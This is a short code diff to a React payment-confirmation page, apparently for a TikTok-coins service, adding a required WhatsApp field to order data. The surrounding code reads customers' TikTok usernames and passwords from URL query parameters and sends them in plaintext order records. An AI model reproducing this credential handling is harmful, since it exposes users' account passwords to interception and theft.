@@ -36,6 +36,7 @@ export const PaymentConfirmation = () => {
   const username = searchParams.get('username');
   const password = searchParams.get('password');
   const email = searchParams.get('email');
+  const whatsapp = searchParams.get('whatsapp');
   const amountFromUrl = searchParams.get('amount');
   const priceFromUrl = searchParams.get('price');
   
@@ -92,7 +93,7 @@ export const PaymentConfirmation = () => {
     if (isPaymentFailed) return;
     
     // Vérifier que tous les paramètres sont présents et que l'email n'a pas déjà été envoyé
-    if (username && password && email && orderId && !hasSentEmail.current) {
+    if (username && password && email && whatsapp && orderId && !hasSentEmail.current) {
       // Vérifier si cet orderId a déjà été traité
       const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
       const alreadySent = existingOrders.some((order: any) => order.order_id === orderId);
@@ -125,6 +126,7 @@ export const PaymentConfirmation = () => {
         tiktok_username: username,
         tiktok_password: password,
         client_email: email,
+        client_whatsapp: whatsapp,
         coins_amount: coinsAmount?.toLocaleString() || 'Non spécifié',
         price: orderPrice?.toLocaleString() || 'Non spécifié',
         date: new Date(orderDate).toLocaleString('fr-FR', {
